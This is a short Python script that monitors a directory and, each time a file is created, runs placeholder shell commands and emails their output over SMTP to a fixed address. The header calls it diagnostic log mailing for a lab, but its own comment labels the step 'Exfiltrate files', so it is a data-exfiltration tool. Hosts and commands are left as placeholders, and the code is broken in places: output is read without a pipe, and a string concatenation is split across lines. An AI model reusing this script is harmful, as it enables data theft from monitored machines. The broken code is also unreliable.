# Monitor modifications to FS and email logs for diagnosis.
# For legal purposes only! Originally created for a laboratory environment.

try:
    import smtplib
    import subprocess
    import getpass
    from watchdog.observers import Observer
    from watchdog.events import LoggingEventHandler
    from watchdog.events import FileSystemEventHandler
except ImportError:
    print("Caught ImportError")

class jd_fs_evt_handler(FileSystemEventHandler):
    def __init__(self, observer, fileName):
        self.observer = observer
        self.filename = fileName
    def on_created(self, event):
        p = return_pass()
        sendMail(p)

def pollSys():
    path = '<PATH>'
    obs = Observer()
    fs_evt_handler = jd_fs_evt_handler(obs, path)
    obs.schedule(fs_evt_handler, path, recursive=True)
    obs.start()
    obs.join()

def return_pass():
    return getpass.getpass()

def sendMail(sender_password):
    receiver_email = '<EMAIL>'
    sender_email = '<EMAIL2>'
    smtp_srv = smtplib.SMTP("<SMTP_SERVER_FQDN>", 587)
    smtp_srv.ehlo()
    smtp_srv.starttls()
    smtp_srv.ehlo()
    smtp_srv.login(sender_email,sender_password)

    # Exfiltrate files
    p = subprocess.Popen(['<BASH>'])
    p2 = subprocess.Popen(['<BASH>'])
    p3 = subprocess.Popen(['<BASH>'])
    output = p.stdout.read()
    output2 = p2.stdout.read()
    output3 = p3.stdout.read()
    header = 'To: ' + receiver_email + '\n' + 'From: ' + sender_email + '\n'
    + 'Subject: <SUBJECT>\n'
    message = header + '\n ' + output + '\n\n' + output2 + '\n\n' + output3
    smtp_srv.sendmail(sender_email, receiver_email, message)
    smtp_srv.close()